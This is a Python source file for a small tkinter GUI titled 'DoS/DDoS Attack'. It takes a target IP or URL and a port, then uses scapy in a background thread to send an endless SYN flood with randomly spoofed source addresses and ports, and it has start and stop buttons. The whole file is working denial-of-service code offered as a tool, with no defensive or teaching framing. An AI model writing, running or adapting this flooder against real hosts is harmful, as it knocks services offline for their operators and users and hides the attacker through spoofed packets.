import tkinter as tk
from tkinter import ttk
import socket
from urllib.parse import urlparse
from scapy.all import send, IP, TCP
import random
import threading

syn_flood_running=False
attack_thread = None 

root = tk.Tk()
root.geometry("500x500")
root.title("DoS/DDoS Attack")

#Validation for number in input field
def only_numbers(char):
    return char.isdigit() or char == ""
vcmd = (root.register(only_numbers), "%P")

menu = tk.Frame(root, bg="#2c2c2c", width=150)
menu.pack(side="left", fill="y")

content = tk.Frame(root, bg="#1e1e1e")
content.pack(side="right", fill="both", expand=True)

syn_flood = tk.Frame(content, bg="#1e1e1e")
home = tk.Frame(content, bg="#1e1e1e")

for page in (syn_flood, home):
    page.place(relwidth=1, relheight=1)

def show_page(page):
    page.tkraise()

def syn_flood_attack():
    global syn_flood_running, attack_thread

    if syn_flood_running:
        return
    syn_flood_running = True
    
    target_input = target_inp.get()
    target_port = int(port_inp.get())
    ip = target_input
    packet_sent = 0
    try:
        hostname = urlparse(target_input).hostname
        if hostname:
            ip = socket.gethostbyname(hostname)
        else:
            print(f"No host name, ip: {ip}")
            return
        
        def start_syn_flood():
            global syn_flood_running
            nonlocal packet_sent, ip, target_port
            try:
                while syn_flood_running:
                    source_IP = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    source_port = random.randint(0, 65535)
                    ip_packet = IP(src=source_IP, dst=ip)
                    tcp = TCP(sport=source_port, dport=target_port, flags="S")
                    packet = ip_packet/tcp

                    send(packet, verbose=False)
                    packet_sent += 1
                    print(f"{packet_sent} Packets Sent")
            except Exception as e:
                print(f"Error in attack loop: {e}")
            finally:
                syn_flood_running = False
                print(f"Attack stopped. Total packets sent: {packet_sent}")
        
        attack_thread = threading.Thread(target=start_syn_flood)
        attack_thread.daemon=True
        attack_thread.start()
    except:
        syn_flood_running=False
        print("Error")
    pass

def stop_syn_flood():
    global syn_flood_running
    syn_flood_running = False
    print("Stopping attack...")

btn1 = tk.Button(menu, text="home", command=lambda: show_page(home))
btn1.pack(fill="x", pady=5)
btn2 = tk.Button(menu, text="SynFlood", command=lambda: show_page(syn_flood))
btn2.pack(fill="x", pady=5)

tk.Label(home, text="This is Home", fg="white", bg="#1e1e1e").pack(pady=20)

# region syn flood UI
target_label = tk.Label(syn_flood, text="Target Ip")
target_inp = tk.Entry(syn_flood, background="#333333")
target_label.pack(padx=10, pady=5)
target_inp.pack(padx=10, pady=5)
target_note = tk.Label(syn_flood, text="Target machine's IP address or url")

port_label = tk.Label(syn_flood, text="Port number")
port_inp = tk.Entry(syn_flood, background="#333333", validate="key", validatecommand=vcmd)
port_label.pack(padx=10, pady=5)
port_inp.pack(padx=10, pady=5)

syn_btn = tk.Button(syn_flood, text="Start Attack", command=syn_flood_attack)
syn_btn.pack()
syn_btn = tk.Button(syn_flood, text="Stop Attack", command=stop_syn_flood)
syn_btn.pack()
# endregion

show_page(home)
root.mainloop()